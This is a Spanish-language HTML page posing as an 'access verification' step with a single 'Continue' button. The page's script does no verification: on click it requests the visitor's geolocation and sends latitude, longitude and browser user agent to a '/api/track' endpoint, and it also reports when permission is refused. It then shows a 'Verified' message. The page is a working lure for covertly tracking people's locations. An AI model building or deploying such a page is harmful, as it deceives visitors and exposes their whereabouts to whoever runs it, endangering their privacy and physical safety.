<!DOCTYPE html>
<html lang="es">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación</title>

<style>
body {
  margin: 0;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
  font-family: Arial, sans-serif;
  color: white;
  text-align: center;
}

.container {
  padding: 20px;
}

h1 {
  font-size: 28px;
  margin-bottom: 20px;
}

button {
  font-size: 22px;
  padding: 18px 40px;
  border: none;
  border-radius: 12px;
  background: #00c6ff;
  color: white;
  cursor: pointer;
  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
}

button:active {
  transform: scale(0.95);
}
</style>
</head>

<body>

<div class="container">
  <h1>Verificación de acceso</h1>
  <p>Presiona el botón para continuar</p>
  <br>
  <button onclick="start()">Continuar</button>
</div>

<script>
async function sendData(data) {
  await fetch("/api/track", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(data)
  });
}

function start() {
  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      await sendData({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        userAgent: navigator.userAgent
      });

      document.body.innerHTML = "<h2>Verificado ✅</h2>";
    },
    async () => {
      await sendData({ error: "No dio permisos" });
      document.body.innerHTML = "<h2>Error ⚠️</h2>";
    }
  );
}
</script>

</body>
</html>

</body>
</html>
